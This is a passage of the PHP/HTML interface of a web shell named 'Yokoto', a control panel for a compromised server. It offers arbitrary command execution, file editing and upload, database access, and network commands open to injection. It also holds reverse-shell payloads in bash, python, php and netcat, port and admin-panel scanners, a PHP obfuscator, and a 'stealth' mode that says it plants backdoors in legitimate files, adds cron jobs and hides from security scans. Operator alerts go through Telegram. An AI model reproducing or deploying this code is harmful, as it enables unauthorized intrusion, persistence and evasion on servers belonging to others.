/* RESPONSIVE */
@media(max-width:992px){.grid-4{grid-template-columns:1fr 1fr;}}
@media(max-width:768px){
    .menu-toggle{display:flex;}
    .sidebar{transform:translateX(-100%);width:290px;}
    .sidebar.open{transform:translateX(0);}
    .overlay.active{display:block;}
    .main{margin-left:0;padding:16px;padding-top:72px;}
    .grid-2,.grid-3,.grid-4,.grid-5{grid-template-columns:1fr;}
    .form-inline{flex-direction:column;align-items:stretch;}
    .form-inline input,.form-inline select,.form-inline button{width:100%;flex:1 0 auto;}
    th,td{padding:6px 6px;font-size:11px;}
    .top-bar{flex-direction:column;align-items:flex-start;}
    .stat-card .number{font-size:24px;}
}
@media(max-width:480px){
    .main{padding:10px;padding-top:64px;}
    .card-body{padding:14px;}
    .modal-content{padding:20px;}
}
</style>
</head>
<body>

<div class="overlay" id="overlay"></div>
<button class="menu-toggle" id="menuToggle">☰</button>

<div class="sidebar" id="sidebar">
    <div class="sidebar-header">
        <img src="<?php echo YOKOTO_LOGO; ?>" alt="logo">
        <h3><?php echo YOKOTO_NAME; ?></h3>
        <p><?php echo YOKOTO_STUDIO; ?></p>
        <span class="ver">v<?php echo YOKOTO_VERSION; ?> • <?php echo $CONFIG['division']; ?></span>
    </div>
    <nav>
        <a href="?action=dashboard" class="<?php echo $action=='dashboard'?'active':''; ?>"><span class="icon">📊</span>Dashboard</a>
        <a href="?action=files" class="<?php echo $action=='files'?'active':''; ?>"><span class="icon">📁</span>Files</a>
        <a href="?action=terminal" class="<?php echo $action=='terminal'?'active':''; ?>"><span class="icon">💻</span>Terminal</a>
        <a href="?action=upload_page" class="<?php echo $action=='upload_page'?'active':''; ?>"><span class="icon">📤</span>Upload</a>
        <a href="?action=database" class="<?php echo $action=='database'?'active':''; ?>"><span class="icon">🗄️</span>Database</a>
        <a href="?action=network" class="<?php echo $action=='network'?'active':''; ?>"><span class="icon">🌐</span>Network</a>
        <a href="?action=curl_page" class="<?php echo $action=='curl_page'?'active':''; ?>"><span class="icon">⬇️</span>cURL</a>
        <a href="?action=revshell" class="<?php echo $action=='revshell'?'active':''; ?>"><span class="icon">🔄</span>RevShell</a>
        <a href="?action=port_scan_page" class="<?php echo $action=='port_scan_page'?'active':''; ?>"><span class="icon">🔍</span>Port Scan</a>
        <a href="?action=admin_finder_page" class="<?php echo $action=='admin_finder_page'?'active':''; ?>"><span class="icon">🎯</span>Admin Finder</a>
        <a href="?action=subdomain_page" class="<?php echo $action=='subdomain_page'?'active':''; ?>"><span class="icon">🌐</span>Subdomain</a>
        <a href="?action=search_page" class="<?php echo $action=='search_page'?'active':''; ?>"><span class="icon">🔎</span>Search</a>
        <a href="?action=zip_page" class="<?php echo $action=='zip_page'?'active':''; ?>"><span class="icon">📦</span>ZIP</a>
        <a href="?action=code_tools" class="<?php echo $action=='code_tools'?'active':''; ?>"><span class="icon">⚡</span>Code Tools</a>
        <a href="?action=vuln_scan" class="<?php echo $action=='vuln_scan'?'active':''; ?>"><span class="icon">🛡️</span>Vuln Scan</a>
        <a href="?action=activate_stealth" class="<?php echo $action=='activate_stealth'?'active':''; ?>"><span class="icon">🕵️</span>Stealth</a>
        <a href="?action=info" class="<?php echo $action=='info'?'active':''; ?>"><span class="icon">ℹ️</span>Info</a>
        <a href="?action=test_telegram" class="<?php echo $action=='test_telegram'?'active':''; ?>"><span class="icon">📨</span>Telegram</a>
        <a href="?action=logout" class="logout"><span class="icon">🚪</span>Logout</a>
    </nav>
</div>

<div class="main">
    <div class="top-bar">
        <h1><?php echo YOKOTO_NAME; ?></h1>
        <span class="version-info"><?php echo date('Y-m-d H:i:s'); ?> • <?php echo $_SERVER['SERVER_NAME'] ?? 'local'; ?></span>
    </div>

    <?php if ($msg): ?>
    <div class="message <?php echo strpos($msg,'[-]')!==false?'error':(strpos($msg,'[+]')!==false?'success':'info'); ?>">
        <?php echo htmlspecialchars($msg); ?>
    </div>
    <?php endif; ?>

    <?php if ($action != 'view' && $action != 'files'): ?>
    <div class="path-bar">
        <span class="label">📂</span>
        <span class="path"><?php echo htmlspecialchars($path); ?></span>
        <a href="?action=<?php echo $action; ?>&path=<?php echo urlencode(dirname(rtrim($path,'/'))); ?>">⬆ Up</a>
    </div>
    <?php endif; ?>

    <!-- ============================================================
    DASHBOARD
    ============================================================ -->
    <?php if ($action == 'dashboard'): ?>
    <div class="grid-4">
        <div class="stat-card"><div class="number"><?php echo count($files); ?></div><div class="label">Total Files</div></div>
        <div class="stat-card"><div class="number"><?php echo $sys_info['php']; ?></div><div class="label">PHP Version</div></div>
        <div class="stat-card"><div class="number"><?php echo ini_get('max_execution_time'); ?>s</div><div class="label">Max Exec Time</div></div>
        <div class="stat-card"><div class="number"><?php echo ini_get('memory_limit'); ?></div><div class="label">Memory Limit</div></div>
    </div>
    <div class="grid-2">
        <div class="card">
            <div class="card-header">🔧 System Information</div>
            <div class="card-body">
                <pre><?php echo htmlspecialchars($sys_info['os']); ?></pre>
                <table style="width:100%;margin-top:10px;font-size:12px;">
                    <tr><td width="160">Server Software</td><td><?php echo $sys_info['server_software']; ?></td></tr>
                    <tr><td>Server Name</td><td><?php echo $sys_info['server_name']; ?></td></tr>
                    <tr><td>Server IP</td><td><?php echo $sys_info['server_addr']; ?></td></tr>
                    <tr><td>Current User</td><td><?php echo $sys_info['user']; ?></td></tr>
                    <tr><td>Document Root</td><td><?php echo $sys_info['document_root']; ?></td></tr>
                </table>
            </div>
        </div>
        <div class="card">
            <div class="card-header">📊 Quick Stats</div>
            <div class="card-body">
                <table style="width:100%;font-size:12px;">
                    <tr><td width="160">Upload Max Size</td><td><?php echo $sys_info['upload_max']; ?></td></tr>
                    <tr><td>Post Max Size</td><td><?php echo $sys_info['post_max_size']; ?></td></tr>
                    <tr><td>Memory Limit</td><td><?php echo $sys_info['memory_limit']; ?></td></tr>
                    <tr><td>Allow URL Fopen</td><td><span class="badge <?php echo $sys_info['allow_url_fopen']=='On'?'badge-success':'badge-danger'; ?>"><?php echo $sys_info['allow_url_fopen']; ?></span></td></tr>
                    <tr><td>Allow URL Include</td><td><span class="badge <?php echo $sys_info['allow_url_include']=='On'?'badge-success':'badge-danger'; ?>"><?php echo $sys_info['allow_url_include']; ?></span></td></tr>
                    <tr><td>Disabled Functions</td><td><?php echo $sys_info['disabled']; ?></td></tr>
                </table>
            </div>
        </div>
    </div>
    <div class="card">
        <div class="card-header">🌍 Server Environment</div>
        <div class="card-body">
            <div style="max-height:400px;overflow-y:auto;">
            <pre><?php foreach ($_SERVER as $k => $v) echo htmlspecialchars("$k: $v\n"); ?></pre>
            </div>
        </div>
    </div>
    <?php endif; ?>

    <!-- ============================================================
    FILES
    ============================================================ -->
    <?php if ($action == 'files'): ?>
    <div class="card">
        <div class="card-header">📁 File Manager • <?php echo count($files); ?> items</div>
        <div class="card-body">
            <div class="form-inline" style="margin-bottom:18px;">
                <form method="POST" action="?action=create_folder&path=<?php echo urlencode($path); ?>" class="form-inline">
                    <input type="text" name="folder_name" placeholder="folder_name" required style="width:180px;">
                    <button type="submit" class="primary">📁 New Folder</button>
                </form>
                <button class="primary" onclick="document.getElementById('fileModal').classList.add('active')">📄 New File</button>
            </div>
            <div class="table-wrapper">
                <table>
                    <thead>
                        <tr>
                            <th style="width:40%;">Name</th>
                            <th style="width:15%;">Size</th>
                            <th style="width:15%;">Perms</th>
                            <th style="width:20%;">Modified</th>
                            <th style="width:10%;">Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php foreach ($files as $file): 
                            $fullpath = $path . $file;
                            $is_dir = is_dir($fullpath);
                            $file_size = $is_dir ? '-' : format_size(filesize($fullpath));
                            $file_perms = yokoto_get_perms($fullpath);
                            $file_mtime = is_file($fullpath) || is_dir($fullpath) ? date('Y-m-d H:i:s', filemtime($fullpath)) : '-';
                            $icon = $is_dir ? '📁' : '📄';
                        ?>
                        <tr>
                            <td>
                                <?php if ($is_dir): ?>
                                    <a href="?action=files&path=<?php echo urlencode($fullpath); ?>" style="color:var(--accent);text-decoration:none;font-weight:500;">
                                        <?php echo $icon . ' ' . htmlspecialchars($file); ?>
                                    </a>
                                <?php else: ?>
                                    <span style="color:var(--text-secondary);"><?php echo $icon . ' ' . htmlspecialchars($file); ?></span>
                                <?php endif; ?>
                            </td>
                            <td><?php echo $file_size; ?></td>
                            <td><code><?php echo $file_perms; ?></code></td>
                            <td><?php echo $file_mtime; ?></td>
                            <td style="display:flex;gap:6px;flex-wrap:wrap;">
                                <?php if (!$is_dir): ?>
                                    <a href="?action=view&view=<?php echo urlencode($file); ?>&path=<?php echo urlencode($path); ?>" style="color:var(--accent);text-decoration:none;font-size:12px;">✏️</a>
                                    <a href="?action=download&download=<?php echo urlencode($file); ?>&path=<?php echo urlencode($path); ?>" style="color:var(--success);text-decoration:none;font-size:12px;">⬇️</a>
                                <?php endif; ?>
                                <button onclick="renameFile('<?php echo htmlspecialchars($file); ?>')" style="background:none;border:none;color:var(--warning);cursor:pointer;font-size:12px;">📝</button>
                                <button onclick="chmodFile('<?php echo htmlspecialchars($file); ?>')" style="background:none;border:none;color:var(--accent);cursor:pointer;font-size:12px;">🔐</button>
                                <a href="?action=delete&delete=<?php echo urlencode($file); ?>&path=<?php echo urlencode($path); ?>" onclick="return confirm('Delete this item?')" style="color:var(--danger);text-decoration:none;font-size:12px;">🗑️</a>
                            </td>
                        </tr>
                        <?php endforeach; ?>
                        <?php if (empty($files)): ?>
                        <tr><td colspan="5" style="text-align:center;color:var(--text-muted);padding:30px;">Directory is empty</td></tr>
                        <?php endif; ?>
                    </tbody>
                </table>
            </div>
        </div>
    </div>

    <div class="modal-overlay" id="fileModal">
        <div class="modal-content">
            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;">
                <h3 style="color:var(--accent);">📄 Create New File</h3>
                <button onclick="document.getElementById('fileModal').classList.remove('active')" class="close">✕</button>
            </div>
            <form method="POST" action="?action=create_file&path=<?php echo urlencode($path); ?>">
                <div class="form-group">
                    <label>Filename</label>
                    <input type="text" name="file_name" placeholder="filename.php" required>
                </div>
                <div class="form-group">
                    <label>Content</label>
                    <textarea name="file_content" rows="12" style="width:100%;font-family:monospace;resize:vertical;"></textarea>
                </div>
                <button type="submit" class="primary">💾 Create File</button>
            </form>
        </div>
    </div>
    <?php endif; ?>

    <!-- ============================================================
    VIEW / EDIT
    ============================================================ -->
    <?php if ($action == 'view' && isset($_GET['view'])): ?>
    <div class="card">
        <div class="card-header">✏️ Editing: <?php echo htmlspecialchars($_GET['view']); ?></div>
        <div class="card-body">
            <form method="POST" action="?action=save&path=<?php echo urlencode($path); ?>">
                <input type="hidden" name="save_file" value="<?php echo htmlspecialchars($_GET['view']); ?>">
                <textarea name="content" class="code-editor"><?php echo htmlspecialchars($edit_content); ?></textarea>
                <div style="margin-top:16px;display:flex;gap:10px;flex-wrap:wrap;">
                    <button type="submit" class="primary">💾 Save File</button>
                    <a href="?action=files&path=<?php echo urlencode($path); ?>" class="btn">⬅ Back to Files</a>
                </div>
            </form>
        </div>
    </div>
    <?php endif; ?>

    <!-- ============================================================
    TERMINAL
    ============================================================ -->
    <?php if ($action == 'terminal'): ?>
    <div class="card">
        <div class="card-header">💻 Interactive Terminal</div>
        <div class="card-body">
            <div class="terminal">
                <div class="terminal-output" id="termOut">
                    <div class="terminal-line">[!] Yokoto Terminal v<?php echo YOKOTO_VERSION; ?></div>
                    <div class="terminal-line">[!] Type commands and press Enter</div>
                    <div class="terminal-line">[!] Supports: ls, cd, pwd, cat, echo, curl, wget, python, php, etc</div>
                </div>
                <div class="terminal-input">
                    <span class="terminal-prompt">$></span>
                    <input type="text" id="termCmd" placeholder="Enter command..." autofocus>
                    <button class="primary" id="termRun">▶ Run</button>
                    <button class="btn" id="termClear">Clear</button>
                </div>
            </div>
        </div>
    </div>
    <script>
    (function(){
        const out=document.getElementById('termOut'), cmd=document.getElementById('termCmd'), run=document.getElementById('termRun'), clear=document.getElementById('termClear');
        function addLine(t,e=false){let l=document.createElement('div');l.className='terminal-line';if(e)l.style.color='#ef4444';l.innerHTML=t;out.appendChild(l);out.scrollTop=out.scrollHeight;}
        function runCmd(){
            let c=cmd.value.trim();if(!c)return;
            addLine('<span style="color:#6366f1;">$></span> '+c);
            cmd.value='';
            cmd.disabled=true;
            fetch(window.location.href,{
                method:'POST',
                headers:{'Content-Type':'application/x-www-form-urlencoded'},
                body:'action=exec_cmd&command='+encodeURIComponent(c)+'&ajax=1'
            })
            .then(r=>r.text())
            .then(d=>{
                d.split('\n').forEach(l=>{if(l.trim())addLine(l);});
                addLine('─'.repeat(50));
                cmd.disabled=false;cmd.focus();
            })
            .catch(e=>{addLine('[!] Error: '+e,true);cmd.disabled=false;cmd.focus();});
        }
        run.addEventListener('click',runCmd);
        cmd.addEventListener('keypress',e=>{if(e.key==='Enter')runCmd();});
        if(clear){clear.addEventListener('click',function(){out.innerHTML='';});}
        cmd.focus();
    })();
    </script>
    <?php endif; ?>

    <!-- ============================================================
    AJAX HANDLER
    ============================================================ -->
    <?php if (isset($_POST['ajax']) && $_POST['ajax']=='1' && isset($_POST['command'])): ?>
    <?php $out = yokoto_exec($_POST['command']); echo implode("\n", $out); exit; ?>
    <?php endif; ?>

    <!-- ============================================================
    UPLOAD
    ============================================================ -->
    <?php if ($action == 'upload_page'): ?>
    <div class="card">
        <div class="card-header">📤 File Uploader</div>
        <div class="card-body">
            <form method="POST" enctype="multipart/form-data" action="?action=upload&path=<?php echo urlencode($path); ?>">
                <div style="border:2px dashed var(--border-color);border-radius:var(--radius-sm);padding:40px;text-align:center;margin-bottom:16px;transition:var(--transition);">
                    <input type="file" name="upload_file" id="uploadInput" style="display:none;" required>
                    <label for="uploadInput" style="cursor:pointer;color:var(--text-secondary);">
                        <div style="font-size:48px;margin-bottom:8px;">📁</div>
                        <div>Click to select file or drag & drop</div>
                        <div style="font-size:12px;margin-top:4px;">Max: <?php echo $CONFIG['max_upload'] / 1024 / 1024; ?> MB</div>
                    </label>
                </div>
                <button type="submit" class="primary">⬆ Upload File</button>
            </form>
        </div>
    </div>
    <?php endif; ?>

    <!-- ============================================================
    DATABASE
    ============================================================ -->
    <?php if ($action == 'database'): ?>
    <div class="card">
        <div class="card-header">🗄️ Database Manager</div>
        <div class="card-body">
            <form method="POST" action="?action=db_query">
                <div class="grid-2">
                    <div class="form-group"><label>Host</label><input type="text" name="db_host" placeholder="localhost" value="localhost"></div>
                    <div class="form-group"><label>Username</label><input type="text" name="db_user" placeholder="username"></div>
                    <div class="form-group"><label>Password</label><input type="password" name="db_pass" placeholder="password"></div>
                    <div class="form-group"><label>Database</label><input type="text" name="db_name" placeholder="database_name"></div>
                </div>
                <div class="form-group"><label>SQL Query</label><textarea name="db_query" rows="6" style="width:100%;font-family:monospace;" placeholder="SELECT * FROM users WHERE id = 1"></textarea></div>
                <button type="submit" class="primary">▶ Execute Query</button>
            </form>
            <?php if ($sql_result !== null): ?>
            <div style="margin-top:16px;">
                <div style="font-weight:600;color:var(--accent);font-size:13px;">Result: <?php echo count($sql_result); ?> rows</div>
                <pre><?php echo htmlspecialchars(json_encode($sql_result, JSON_PRETTY_PRINT)); ?></pre>
            </div>
            <?php endif; ?>
        </div>
    </div>
    <?php endif; ?>

    <!-- ============================================================
    NETWORK
    ============================================================ -->
    <?php if ($action == 'network'): ?>
    <div class="card">
        <div class="card-header">🌐 Network Tools</div>
        <div class="card-body">
            <form method="POST">
                <div class="form-inline">
                    <input type="text" name="net_target" placeholder="IP or Domain" style="flex:1;" required>
                    <select name="net_type">
                        <option value="ping">Ping</option>
                        <option value="traceroute">Traceroute</option>
                        <option value="nslookup">NSLookup</option>
                        <option value="whois">Whois</option>
                        <option value="host">Host</option>
                        <option value="dig">Dig</option>
                    </select>
                    <button type="submit" name="net_submit" class="primary">▶ Run</button>
                </div>
            </form>
            <?php if (isset($_POST['net_submit'])): 
                $net_cmd = '';
                switch($_POST['net_type']){
                    case 'ping': $net_cmd = 'ping -c 4 ' . $_POST['net_target']; break;
                    case 'traceroute': $net_cmd = 'traceroute ' . $_POST['net_target']; break;
                    case 'nslookup': $net_cmd = 'nslookup ' . $_POST['net_target']; break;
                    case 'whois': $net_cmd = 'whois ' . $_POST['net_target']; break;
                    case 'host': $net_cmd = 'host ' . $_POST['net_target']; break;
                    case 'dig': $net_cmd = 'dig ' . $_POST['net_target']; break;
                }
                $net_out = yokoto_exec($net_cmd);
            ?>
            <pre style="margin-top:16px;"><?php echo htmlspecialchars(implode("\n", $net_out)); ?></pre>
            <?php endif; ?>
        </div>
    </div>
    <?php endif; ?>

    <!-- ============================================================
    CURL
    ============================================================ -->
    <?php if ($action == 'curl_page'): ?>
    <div class="card">
        <div class="card-header">⬇️ cURL HTTP Client</div>
        <div class="card-body">
            <form method="POST" action="?action=curl_request">
                <div class="form-group"><label>URL</label><input type="url" name="curl_url" placeholder="https://api.example.com/endpoint" style="width:100%;" required></div>
                <div class="grid-2">
                    <div class="form-group"><label>Method</label><select name="curl_method"><option>GET</option><option>POST</option><option>PUT</option><option>DELETE</option><option>PATCH</option><option>HEAD</option></select></div>
                    <div class="form-group"><label>Timeout (seconds)</label><input type="number" name="curl_timeout" value="30" min="1" max="120"></div>
                </div>
                <div class="form-group"><label>Data (for POST/PUT/PATCH)</label><textarea name="curl_data" rows="4" style="width:100%;font-family:monospace;" placeholder='{"key": "value"} or key=value'></textarea></div>
                <div class="form-group"><label>Headers (one per line)</label><textarea name="curl_headers" rows="3" style="width:100%;font-family:monospace;" placeholder="Content-Type: application/json&#10;Authorization: Bearer token"></textarea></div>
                <button type="submit" class="primary">🚀 Send Request</button>
            </form>
            <?php if ($curl_result !== null): ?>
            <div style="margin-top:20px;">
                <div class="card-header" style="margin-bottom:10px;">Response</div>
                <div><strong>HTTP Status:</strong> <?php echo $curl_result['http_code']; ?></div>
                <?php if ($curl_result['error']): ?>
                <div class="message error" style="margin-top:10px;">Error: <?php echo htmlspecialchars($curl_result['error']); ?></div>
                <?php endif; ?>
                <pre style="margin-top:10px;"><?php echo htmlspecialchars($curl_result['response']); ?></pre>
            </div>
            <?php endif; ?>
        </div>
    </div>
    <?php endif; ?>

    <!-- ============================================================
    REVERSE SHELL
    ============================================================ -->
    <?php if ($action == 'revshell'): ?>
    <div class="card">
        <div class="card-header">🔄 Reverse Shell</div>
        <div class="card-body">
            <form method="POST" action="?action=send_revshell">
                <div class="form-inline">
                    <input type="text" name="rev_ip" placeholder="Your IP Address" required>
                    <input type="text" name="rev_port" placeholder="Port" value="4444" required>
                    <button type="submit" class="danger">🚀 Send Reverse Shell</button>
                </div>
            </form>
            <div style="margin-top:20px;">
                <div style="font-weight:600;color:var(--accent);font-size:13px;">📋 Payload Examples</div>
                <div class="tabs">
                    <span class="tab active" onclick="showPayload('bash')">Bash</span>
                    <span class="tab" onclick="showPayload('python')">Python</span>
                    <span class="tab" onclick="showPayload('php')">PHP</span>
                    <span class="tab" onclick="showPayload('nc')">Netcat</span>
                </div>
                <pre id="payloadDisplay">bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1</pre>
                <p style="margin-top:10px;font-size:12px;color:var(--text-muted);">Listener: nc -lvnp PORT</p>
            </div>
        </div>
    </div>
    <script>
    function showPayload(type){
        const payloads = {
            bash: 'bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1',
            python: 'python -c \'import socket,subprocess,os;s=socket.socket();s.connect(("YOUR_IP",YOUR_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
            php: 'php -r \'$sock=fsockopen("YOUR_IP",YOUR_PORT);exec("/bin/sh -i <&3 >&3 2>&3");\'',
            nc: 'nc -e /bin/sh YOUR_IP YOUR_PORT'
        };
        document.getElementById('payloadDisplay').textContent = payloads[type] || payloads.bash;
        document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
        event.target.classList.add('active');
    }
    </script>
    <?php endif; ?>

    <!-- ============================================================
    PORT SCAN
    ============================================================ -->
    <?php if ($action == 'port_scan_page'): ?>
    <div class="card">
        <div class="card-header">🔍 Port Scanner</div>
        <div class="card-body">
            <form method="POST" action="?action=port_scan">
                <div class="form-inline">
                    <input type="text" name="scan_ip" placeholder="IP Address" style="flex:1;" required>
                    <button type="submit" class="primary">🔎 Scan Common Ports</button>
                </div>
            </form>
            <?php if ($scan_result): ?>
            <div style="margin-top:16px;">
                <div style="font-weight:600;color:var(--accent);font-size:13px;">Scan Results:</div>
                <pre><?php foreach($scan_result as $r) echo $r."\n"; ?></pre>
            </div>
            <?php endif; ?>
        </div>
    </div>
    <?php endif; ?>

    <!-- ============================================================
    ADMIN FINDER
    ============================================================ -->
    <?php if ($action == 'admin_finder_page'): ?>
    <div class="card">
        <div class="card-header">🎯 Admin Panel Finder</div>
        <div class="card-body">
            <form method="POST" action="?action=admin_finder">
                <div class="form-inline">
                    <input type="url" name="admin_url" placeholder="https://target.com" style="flex:1;" required>
                    <button type="submit" class="primary">🎯 Find Admin Panels</button>
                </div>
            </form>
            <?php if ($admin_result): ?>
            <div style="margin-top:16px;">
                <div style="font-weight:600;color:var(--accent);font-size:13px;">Found Admin Panels:</div>
                <pre><?php foreach($admin_result as $a) echo $a."\n"; ?></pre>
            </div>
            <?php endif; ?>
        </div>
    </div>
    <?php endif; ?>

    <!-- ============================================================
    SUBDOMAIN FINDER
    ============================================================ -->
    <?php if ($action == 'subdomain_page'): ?>
    <div class="card">
        <div class="card-header">🌐 Subdomain Finder</div>
        <div class="card-body">
            <form method="POST" action="?action=subdomain_finder">
                <div class="form-inline">
                    <input type="text" name="domain" placeholder="domain.com" style="flex:1;" required>
                    <button type="submit" class="primary">🌐 Find Subdomains</button>
                </div>
            </form>
            <?php if (isset($sub_result)): ?>
            <div style="margin-top:16px;">
                <div style="font-weight:600;color:var(--accent);font-size:13px;">Found Subdomains:</div>
                <pre><?php foreach($sub_result as $s) echo $s."\n"; ?></pre>
            </div>
            <?php endif; ?>
        </div>
    </div>
    <?php endif; ?>

    <!-- ============================================================
    SEARCH
    ============================================================ -->
    <?php if ($action == 'search_page'): ?>
    <div class="card">
        <div class="card-header">🔎 File Search</div>
        <div class="card-body">
            <form method="POST" action="?action=do_search&path=<?php echo urlencode($path); ?>">
                <div class="form-inline">
                    <input type="text" name="search_term" placeholder="filename pattern" style="flex:1;" required>
                    <button type="submit" class="primary">🔎 Search</button>
                </div>
            </form>
            <?php if ($search_results): ?>
            <div class="table-wrapper" style="margin-top:16px;">
                <table>
                    <thead><tr><th>File</th><th>Size</th><th>Modified</th></tr></thead>
                    <tbody>
                        <?php foreach($search_results as $r): ?>
                        <tr>
                            <td><code><?php echo htmlspecialchars($r['path']); ?></code></td>
                            <td><?php echo $r['size']; ?></td>
                            <td><?php echo $r['mtime']; ?></td>
                        </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            </div>
            <?php endif; ?>
        </div>
    </div>
    <?php endif; ?>

    <!-- ============================================================
    ZIP EXTRACTOR
    ============================================================ -->
    <?php if ($action == 'zip_page'): ?>
    <div class="card">
        <div class="card-header">📦 ZIP Extractor</div>
        <div class="card-body">
            <form method="POST" action="?action=zip_extract">
                <div class="form-inline">
                    <input type="text" name="zip_file" placeholder="filename.zip" style="flex:1;" required>
                    <button type="submit" class="primary">📦 Extract ZIP</button>
                </div>
            </form>
            <p style="margin-top:10px;font-size:12px;color:var(--text-muted);">Extracts to current directory. Requires ZipArchive extension.</p>
        </div>
    </div>
    <?php endif; ?>

    <!-- ============================================================
    CODE TOOLS
    ============================================================ -->
    <?php if ($action == 'code_tools'): ?>
    <div class="card">
        <div class="card-header">⚡ Code Tools</div>
        <div class="card-body">
            <div class="grid-2">
                <div>
                    <h4 style="color:var(--accent);margin-bottom:10px;">✨ Beautify PHP</h4>
                    <form method="POST" action="?action=beautify">
                        <div class="form-group"><textarea name="code_raw" rows="8" style="width:100%;font-family:monospace;resize:vertical;" placeholder="Paste PHP code to beautify..."></textarea></div>
                        <button type="submit" class="primary">✨ Beautify</button>
                    </form>
                </div>
                <div>
                    <h4 style="color:var(--accent);margin-bottom:10px;">🕵️ Obfuscate PHP</h4>
                    <form method="POST" action="?action=obfuscate">
                        <div class="form-group"><textarea name="obfuscate_code" rows="8" style="width:100%;font-family:monospace;resize:vertical;" placeholder="Paste PHP code to obfuscate..."></textarea></div>
                        <button type="submit" class="primary">🕵️ Obfuscate</button>
                    </form>
                </div>
            </div>
            <?php if ($beautify_result): ?>
            <div style="margin-top:16px;">
                <div style="font-weight:600;color:var(--accent);font-size:13px;">✨ Beautified Result:</div>
                <pre><?php echo htmlspecialchars($beautify_result); ?></pre>
            </div>
            <?php endif; ?>
            <?php if ($obfuscate_result): ?>
            <div style="margin-top:16px;">
                <div style="font-weight:600;color:var(--accent);font-size:13px;">🕵️ Obfuscated Result:</div>
                <pre><?php echo htmlspecialchars($obfuscate_result); ?></pre>
            </div>
            <?php endif; ?>
        </div>
    </div>
    <?php endif; ?>

    <!-- ============================================================
    VULNERABILITY SCAN
    ============================================================ -->
    <?php if ($action == 'vuln_scan'): ?>
    <div class="card">
        <div class="card-header">🛡️ Vulnerability Scanner</div>
        <div class="card-body">
            <?php if ($vuln_result): ?>
            <table style="width:100%;">
                <thead><tr><th>Check</th><th>Status</th></tr></thead>
                <tbody>
                    <?php foreach($vuln_result as $k => $v): ?>
                    <tr>
                        <td><?php echo ucfirst(str_replace('_',' ',$k)); ?></td>
                        <td>
                            <span class="badge <?php echo in_array($v, ['Enabled','Yes','On']) ? 'badge-success' : (in_array($v, ['Disabled','No','Off']) ? 'badge-danger' : 'badge-info'); ?>">
                                <?php echo htmlspecialchars($v); ?>
                            </span>
                        </td>
                    </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
            <?php else: ?>
            <p>Click scan to check server vulnerabilities.</p>
            <form method="POST" action="?action=vuln_scan">
                <button type="submit" class="primary">🛡️ Run Vulnerability Scan</button>
            </form>
            <?php endif; ?>
        </div>
    </div>
    <?php endif; ?>

    <!-- ============================================================
    STEALTH
    ============================================================ -->
    <?php if ($action == 'activate_stealth'): ?>
    <div class="card">
        <div class="card-header">🕵️ Stealth Mode</div>
        <div class="card-body">
            <p style="margin-bottom:16px;">Activate stealth mode to hide shell from cPanel, admin, and common security scans.</p>
            <div style="background:rgba(239,68,68,0.1);border:1px solid rgba(239,68,68,0.2);border-radius:var(--radius-sm);padding:16px;margin-bottom:16px;">
                <strong style="color:var(--danger);">⚠️ Warning:</strong>
                <span style="color:var(--text-secondary);font-size:13px;">This will inject backdoors into legitimate files, create .htaccess rules, add cron jobs, and hide the shell. Use with caution.</span>
            </div>
            <form method="POST" action="?action=activate_stealth">
                <button type="submit" class="success">🕵️ Activate Stealth Mode</button>
            </form>
            <?php if ($stealth_result): ?>
            <div style="margin-top:16px;">
                <div style="font-weight:600;color:var(--success);font-size:13px;">✅ Stealth Activated:</div>
                <pre><?php foreach($stealth_result as $r) echo "[+] $r\n"; ?></pre>
            </div>
            <?php endif; ?>
            
            <div style="margin-top:20px;border-top:1px solid var(--border-color);padding-top:16px;">
                <div style="font-weight:600;color:var(--danger);font-size:13px;">💀 Self Destruct</div>
                <p style="font-size:12px;color:var(--text-muted);margin-bottom:10px;">Permanently delete this shell and all backup copies.</p>
                <form method="POST" action="?action=self_destruct" onsubmit="return confirm('ARE YOU SURE? This will permanently delete the shell and all backups!');">
                    <input type="hidden" name="confirm" value="yes">
                    <button type="submit" class="danger">💀 Self Destruct</button>
                </form>
            </div>
        </div>
    </div>
    <?php endif; ?>

    <!-- ============================================================
    TELEGRAM
    ============================================================ -->
    <?php if ($action == 'test_telegram'): ?>
    <div class="card">
        <div class="card-header">📨 Telegram Integration</div>
        <div class="card-body">
            <p style="margin-bottom:16px;">Test Telegram notification or send custom messages.</p>
            <form method="POST" action="?action=send_telegram">
                <div class="form-group">
                    <label>Message</label>
                    <textarea name="telegram_msg" rows="4" style="width:100%;font-family:monospace;" placeholder="Custom message to send..."></textarea>
                </div>
                <button type="submit" class="primary">📨 Send Message</button>
            </form>
            <?php if ($msg && strpos($msg,'Telegram') !== false): ?>
            <div class="message success" style="margin-top:16px;"><?php echo $msg; ?></div>
            <?php endif; ?>
            <div style="margin-top:16px;font-size:12px;color:var(--text-muted);">
                <strong>Bot Token:</strong> <?php echo substr($CONFIG['telegram_token'],0,10); ?>...<br>
                <strong>Chat ID:</strong> <?php echo $CONFIG['telegram_chat_id']; ?>
            </div>
        </div>
    </div>
    <?php endif; ?>

    <!-- ============================================================
    SEND TELEGRAM
    ============================================================ -->
    <?php if ($action == 'send_telegram' && isset($_POST['telegram_msg'])): ?>
    <?php $result = yokoto_telegram($_POST['telegram_msg']); ?>
    <?php $msg = $result ? "[+] Telegram message sent!" : "[-] Failed to send message."; ?>
    <?php header('Location: ?action=test_telegram&msg='.urlencode($msg)); exit; ?>
    <?php endif; ?>

    <!-- ============================================================
    SYSTEM INFO
    ============================================================ -->
    <?php if ($action == 'info'): ?>
    <div class="card">
        <div class="card-header">ℹ️ System Information</div>
        <div class="card-body">
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;font-size:13px;">
                <?php foreach($sys_info as $k => $v): ?>
                <div style="display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid var(--border-color);">
                    <span style="color:var(--text-muted);"><?php echo ucfirst(str_replace('_',' ',$k)); ?></span>
                    <span style="word-break:break-all;max-width:60%;text-align:right;"><?php echo htmlspecialchars($v); ?></span>
                </div>
                <?php endforeach; ?>
            </div>
        </div>
    </div>
    
    <div class="card">
        <div class="card-header">📦 PHP Extensions</div>
        <div class="card-body">
            <div style="display:flex;flex-wrap:wrap;gap:6px;">
